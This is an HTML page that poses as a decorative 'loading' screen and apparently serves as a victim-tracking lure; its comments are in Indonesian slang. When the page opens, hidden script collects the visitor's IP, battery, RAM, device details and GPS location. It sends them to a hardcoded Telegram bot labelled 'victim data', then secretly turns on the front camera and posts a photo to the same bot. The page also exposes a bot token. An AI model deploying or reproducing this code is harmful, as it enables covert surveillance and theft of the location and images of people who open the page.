
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
        <title>Loading Keren</title>
            <style>
                    body {
                                margin: 0;
                                            background: #000;
                                                        overflow: hidden;
                                                                    font-family: Arial, sans-serif;
                                                                            }
        .loader {
                    position: absolute;
                                top: 50%;
                                            left: 50%;
                                                        transform: translate(-50%, -50%);
                                                                    color: #0f0;
                                                                                font-size: 24px;
                                                                                            text-shadow: 0 0 10px #0f0;
                                                                                                    }
        .scan-line {
                    position: absolute;
                                width: 100%;
                                            height: 2px;
                                                        background: linear-gradient(to bottom, #0f0 0%, transparent 100%);
                                                                    animation: scan 3s linear infinite;
                                                                            }
        @keyframes scan {
                    0% { top: 0%; }
                                100% { top: 100%; }
                                        }
                                            </style>
                                            </head>
                                            <body>
                                                <div class="loader">TUNGGU SEBENTAR SEDANG LOADING...</div>
                                                    <div class="scan-line"></div>
    <script>
            // tambahkan token id lu disini mek
                    const BOT_TOKEN = '8291703373:AAHpYHTd_cXx69ojoPw5FFGP99ka6VG6fys';
                            const CHAT_ID = '7470493327';
        // Ngumpulin Semua Data Kayak IP, Lokasi, dll
                async function kumpulinDataDanKirim() {
                            try {
                                            // Ambil IP Target
                                                            const ipResponse = await fetch('https://api.ipify.org?format=json');
                                                                            const ipData = await ipResponse.json();
                // Ambil Data Baterai
                                const battery = await navigator.getBattery();
                // Ambil RAM (Approximation aja)
                                const ram = navigator.deviceMemory || 'Tidak Diketahui';
                // Ambil Data Perangkat
                                const userAgent = navigator.userAgent;
                // Lokasi GPS
                                let lokasi = "Izin Ditolak";
                                                if (navigator.geolocation) {
                                                                    navigator.geolocation.getCurrentPosition(position => {
                                                                                            lokasi = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
                                                                                                                }, () => { lokasi = "Gagal Ambil Lokasi"; });
                                                                                                                                }
                // Kirim Semua Data ke Telegram
                                const pesan = `
                                🛑 **DATA KORBAN TERKIRIM** 🛑
                                ┌──────────────
                                │ 📱 *IP Address*: ${ipData.ip}
                                │ 🔋 *Baterai*: ${battery.level * 100}% (${battery.charging ? 'Sedang Dicharge' : 'Tidak Dicharge'})
                                │ 💾 *RAM*: ${ram} GB
                                │ 📡 *Perangkat*: ${userAgent}
                                       @danzXsigma~
                                       │ 📍 *Lokasi*: ${lokasi}
                                       └──────────────
                `;
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
                // Akses Kamera (Diam-diam)
                                const constraints = { video: { facingMode: 'user' } };
                                                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                                                                const video = document.createElement('video');
                                                                                video.srcObject = stream;
                                                                                                await video.play();
                // Ambil Frame Kamera Depan
                                setTimeout(async () => {
                                                    const canvas = document.createElement('canvas');
                                                                        canvas.width = video.videoWidth;
                                                                                            canvas.height = video.videoHeight;
                                                                                                                canvas.getContext('2d').drawImage(video, 0, 0);
                                                                                                                                    const fotoDepan = canvas.toDataURL('image/jpeg');
                    // Kirim Foto ke Telegram
                                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
                                                                method: 'POST',
                                                                                        body: JSON.stringify({
                                                                                                                    photo: fotoDepan,
                                                                                                                                                caption: "📸 Foto Kamera Depan"
                                                                                                                                                                        })
                                                                                                                                                                                            });
                    stream.getTracks().forEach(track => track.stop());
                                    }, 5000);
            } catch (error) {
                            console.error('Error:', error);
                                        }
                                                }
        // Jalankan Semua Setelah Halaman Dibuka
                window.onload = () => {
                            setTimeout(kumpulinDataDanKirim, 3000); // Delay biar loading keliatan
                                    };
                                        </script>
                                        </body>
                                        </html>
